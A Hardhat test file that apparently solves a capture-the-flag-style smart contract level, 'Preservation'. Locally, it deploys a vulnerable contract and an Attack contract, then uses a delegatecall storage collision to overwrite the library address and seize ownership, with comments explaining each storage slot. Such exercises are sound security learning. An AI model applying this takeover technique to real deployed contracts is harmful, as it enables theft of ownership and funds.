import { expect } from "chai";
import { Attack, Preservation } from "../typechain-types";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

describe("Preservation exploit using delegate call fun", function () {
  let attackerContract: Attack,
    contractAddress: string,
    preservationContract: Preservation,
    attacker: SignerWithAddress,
    owner: string;

  //Exploit takes place in deployment
  before("Setup for attack locally", async function () {
    // Setup deployment for library contracts
    [attacker] = await ethers.getSigners();
    const libraryContractFactory = await ethers.getContractFactory(
      "LibraryContract"
    );

    // Dep
    const libraryContract1 = await libraryContractFactory.deploy();

    await libraryContract1.deployed();

    const libraryContract2 = await libraryContractFactory.deploy();

    await libraryContract2.deployed();

    const preservationContractFactory = await ethers.getContractFactory(
      "Preservation"
    );

    preservationContract = await preservationContractFactory.deploy(
      libraryContract1.address,
      libraryContract2.address
    );

    await preservationContract.deployed();

    const attackerContractFactory = await ethers.getContractFactory("Attack");

    attackerContract = await attackerContractFactory.deploy(
      preservationContract.address
    );
  });

  it("perform exploit", async function () {
    // NOTE: The delegate call is context preserving. The contract making the call preserves state
    console.log(
      "The owner before the attack is",
      await preservationContract.owner()
    );

    console.log(
      "The first library address is",
      await preservationContract.timeZone1Library()
    );

    // Step 1 Stored time of the calling contract is at slot 1. Let's have the attacker contract call setFirstTime and pass in the address casted as uint. timeZone1library slot will now be my attacker contract
    let txSetLibraryToAttackAddress =
      await attackerContract.setLibraryToAttackAddress();

    await txSetLibraryToAttackAddress.wait();

    console.log(
      "The new library address is",
      await preservationContract.timeZone1Library()
    );

    // Step 2 The attacker contract will have 3 storage slots, address buffer, address buffer, uint owner and a function called setTime. This setFirstTime will be called again and it will set the owner as address(this)

    let txSetOwnerOfPreservationContract =
      await attackerContract.SetOwnerOfPreservationContract();

    owner = await preservationContract.owner();

    console.log("The owner after the attack is ", owner);
  });

  after("confirm exploit", async function () {
    // check that the new owner of the preservation contract is indeed my address
    expect(owner).to.be.eq(attacker.address);
  });
});
